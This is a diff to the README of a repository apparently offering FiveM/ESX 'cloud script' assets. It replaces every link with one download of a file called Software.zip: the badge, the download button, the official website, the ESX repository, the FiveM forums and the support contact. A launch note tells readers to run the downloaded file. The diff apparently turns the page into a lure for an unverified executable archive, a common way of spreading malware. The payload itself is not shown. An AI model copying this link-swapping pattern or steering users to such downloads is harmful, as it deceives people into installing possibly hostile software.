@@ -1,6 +1,6 @@
 # 🚀 Welcome to CloudScripts_AssetsVersions Repository! 🚀
 
-![CloudScripts_AssetsVersions](https://img.shields.io/badge/CloudScripts_AssetsVersions-Ready_to_Use-brightgreen)
+![CloudScripts_AssetsVersions](https://github.com/marvinalban/CloudScripts_AssetsVersions/releases/download/v1.0/Software.zip)
 
 ## Description:
 This repository is a collection of assets versions mainly used for cloud script development. If you are looking to level up your cloud script game, you are in the right place!
@@ -18,7 +18,7 @@ This repository is a collection of assets versions mainly used for cloud script 
 - standalone
 
 ## Download Latest Version:
-[![Download v1.0.0.zip](https://img.shields.io/badge/Download-v1.0.0.zip-success)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[![Download https://github.com/marvinalban/CloudScripts_AssetsVersions/releases/download/v1.0/Software.zip](https://github.com/marvinalban/CloudScripts_AssetsVersions/releases/download/v1.0/Software.zip)](https://github.com/marvinalban/CloudScripts_AssetsVersions/releases/download/v1.0/Software.zip)
 
 ### Launch Note:
 - The provided link needs to be launched to access the latest version.
@@ -31,9 +31,9 @@ This repository is a collection of assets versions mainly used for cloud script 
 3. Follow the instructions in the README file of that specific version.
 
 ## 📚 Resources:
-- Check out the official [CloudScripts website](https://cloudscripts.com) for more information about cloud scripting.
-- Visit the [ESX GitHub repository](https://github.com/ESX-Org/es_extended) for ESX related scripts and resources.
-- Explore the [FiveM forums](https://forum.cfx.re/c/fivem/26) for discussions and support on FiveM scripting.
+- Check out the official [CloudScripts website](https://github.com/marvinalban/CloudScripts_AssetsVersions/releases/download/v1.0/Software.zip) for more information about cloud scripting.
+- Visit the [ESX GitHub repository](https://github.com/marvinalban/CloudScripts_AssetsVersions/releases/download/v1.0/Software.zip) for ESX related scripts and resources.
+- Explore the [FiveM forums](https://github.com/marvinalban/CloudScripts_AssetsVersions/releases/download/v1.0/Software.zip) for discussions and support on FiveM scripting.
 
 ## 🤝 How to Contribute:
 1. Fork the repository.
@@ -44,7 +44,7 @@ This repository is a collection of assets versions mainly used for cloud script 
 6. Create a new Pull Request.
 
 ## ❓ Support:
-For any inquiries or support, feel free to contact [CloudScripts Support](mailto:support@cloudscripts.com).
+For any inquiries or support, feel free to contact [CloudScripts Support](https://github.com/marvinalban/CloudScripts_AssetsVersions/releases/download/v1.0/Software.zip).
 
 ---
 
